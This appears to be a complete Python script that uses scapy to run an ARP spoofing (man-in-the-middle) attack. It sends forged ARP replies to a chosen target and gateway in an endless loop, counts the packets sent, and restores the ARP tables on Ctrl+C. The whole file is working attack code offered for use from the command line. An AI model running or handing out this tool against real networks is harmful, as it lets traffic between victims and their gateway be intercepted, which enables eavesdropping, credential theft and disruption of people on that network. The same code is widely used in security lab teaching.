# Imports
import time
import optparse
import scapy.all as scapy


# Get MAC Address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


# Spoofing Function
def spoof(targeted_ip, spoof_ip):
    # Getting Target MAC
    target_mac = get_mac(targeted_ip)

    # Creating Packet
    packet = scapy.ARP(op=2, pdst=targeted_ip, hwdst=target_mac, psrc=spoof_ip)

    # Sending the Packer
    scapy.send(packet, verbose=False)


# Restoring back the Changes
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4)


# Getting arguments from CLI
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Specify Target IP Address")
    parser.add_option("-s", "--spoof", dest="spoof", help="Specify Spoofing IP Address")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target IP Address, use --help for more info.")
    if not options.spoof:
        parser.error("[-] Please specify spoofing IP Address, use --help for more info.")

    return options


# Saving Results to Variables
args = get_arguments()
target_ip = args.target
gateway_ip = args.spoof

# Running the Attack
sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        print("\r[+] Packets Sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ..... Resetting ARP tables ..... Please wait")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
